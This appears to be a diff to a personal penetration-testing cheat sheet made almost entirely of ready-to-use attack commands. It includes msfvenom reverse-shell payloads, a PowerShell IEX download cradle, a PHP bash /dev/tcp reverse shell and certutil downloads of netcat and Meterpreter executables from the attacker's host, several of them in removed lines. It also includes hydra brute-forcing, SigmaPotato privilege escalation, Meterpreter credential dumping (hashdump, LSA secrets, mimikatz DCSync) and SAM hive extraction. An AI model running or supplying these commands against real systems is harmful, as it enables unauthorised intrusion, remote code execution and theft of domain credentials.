@@ -121,28 +121,13 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.e
 
 ## File Transfer
 python3 -m http.server 80 -d ~/Upload
-"powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1'')"
-"powershell -c dir C:\programdata\tmp"
+powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1''); dir C:\programdata\tmp"
 
 ## Sorting Files
 sort -u usernames | tee usernames
 sort -u passwords | tee passwords
 
 ## Web
-[*] Reverse Shell
-rlwrap msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
-msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw > msfshell.php
-<?php
-    $lhost = "$MYIP";
-    $lport = 5555;
-    
-    exec("bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
-    $sock = fsockopen($lhost, $lport);
-    if ($sock) {
-        exec("sh <&3 >&3 2>&3");
-        }
-?>
-
 [*] Web Shell
 <html>
 <body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
@@ -305,6 +290,7 @@ C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
 
 [*] (21) FTP
 wget -m -q --no-parent --cut-dirs=1 --no-directories -P ftp ftp://$TARGET
+
 hydra -L usernames -P passwords ftp://$TARGET -t35
 nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
 
@@ -565,40 +551,47 @@ powershell -c "Set-ExecutionPolicy unrestricted"
 services.msc
 
 [*] Meterpreter
-python3 -m http.server 80 -d ~/Downloads/upload
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o msfshell86.exe; cp msfshell86.exe msfshell.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o msfshell64.exe; cp msfshell64.exe msfshell.exe
-powershell -c 'certutil -urlcache -f http://$MYIP:8088/msfshell.exe C:\programdata\msfshell.exe'
+load exploit
+load kiwi
+load priv
 
-cd \\users
-run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
 getuid
 getprivs
 sysinfo
 execute -H -i -f powershell.exe -a "-Command Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
+
 arp
+run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
 ifconfig
-load exploit
-load kiwi
-load priv
-run exploit/windows/local/unquoted_service_path LHOST=$MYIP
+
+getsystem
+cd \\users
 run multi/recon/local_exploit_suggester
+
 run post/windows/gather/enum_ad_users
+run post/windows/gather/enum_ad_computers
 run post/windows/gather/enum_domain
 run post/windows/gather/enum_domains
-run post/windows/gather/enum_unattend
+
+run post/windows/gather/smart_hashdump
+run post/windows/gather/lsa_secrets
 run post/windows/gather/credentials/enum_cred_store
 run post/windows/gather/credentials/gpp
+run post/windows/gather/enum_unattend
 run post/windows/gather/credentials/windows_autologin
+
 hashdump
 creds_all
-kiwi_cmd "lsadump::dcsync /domain:SATURN.local /all /csv"
-getsystem
+kiwi_cmd "lsadump::dcsync /domain:$DOM /all /csv"
+
 cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
 reload_all
+
 background
 sessions
 sessions -i 1
+jobs
+jobs -k 1
 
 [*] Powerview
 Import-Module ./PowerView.ps1
@@ -618,11 +611,6 @@ Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get
 
 [*] SeBackupPrivilege
 robocopy /b \Users\Administrator\Desktop .
-
-[*] File Transfer
-python3 -m http.server -d Downloads/upload/windows 8088
-powershell -c "certutil -urlcache -f http://$MYIP:8088/winpeas.exe C:\programdata\winpeas.exe"
-powershell -c "certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe"
 
 [*] SAM
 cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM;
